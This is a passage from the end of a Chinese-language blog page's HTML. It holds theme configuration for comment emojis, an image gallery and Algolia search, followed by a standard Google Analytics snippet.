"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":null,"highlight":true,"lang":"zh-cn","placeholder":"你的评论 ...","recordIP":null,"visitor":null}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"3M3B3KM4LG","algoliaIndex":"blog","algoliaSearchKey":"babfa85706a3a4a0025db8ff2fdf3525","highlightTag":null,"maxResultLength":null,"noResultsFound":"没有找到结果","snippetLength":null,"type":"algolia"}};</script><script src="/js/theme.min.js" type="text/javascript"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-160185073-2');
+        </script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-160185073-2" type="text/javascript"></script></body>
+</html>
